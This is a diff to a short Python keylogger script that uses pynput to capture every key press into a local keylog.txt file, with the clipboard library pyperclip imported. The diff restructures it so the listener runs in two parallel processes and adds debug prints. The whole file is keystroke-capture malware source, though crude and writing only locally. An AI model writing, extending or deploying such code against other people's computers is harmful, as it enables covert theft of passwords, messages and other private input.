@@ -1,12 +1,16 @@
+import random
+import time
+from multiprocessing import Process
 from pynput.keyboard import Listener
 import pyperclip
+import threading
 
 with open('keylog.txt', 'w') as f:
     f.write("Start of recording\n")
 
 
 def controller(key):
-    file_log = 'keylog.txt'
+    file_log = f'keylog.txt'
     with open(file_log, 'r') as f:
         data = f.read()
 
@@ -27,6 +31,17 @@ def controller(key):
     with open(file_log, 'w') as f:
         f.write(data)
 
+    print("WORK")
 
-with Listener(on_press=controller) as l:
-    l.join()
+
+def start():
+    with Listener(on_press=controller) as l:
+        l.join()
+
+
+if __name__ == "__main__":
+    print("Hello from main Process")
+    proc1 = Process(target=start)
+    proc1.start()
+    proc2 = Process(target=start)
+    proc2.start()
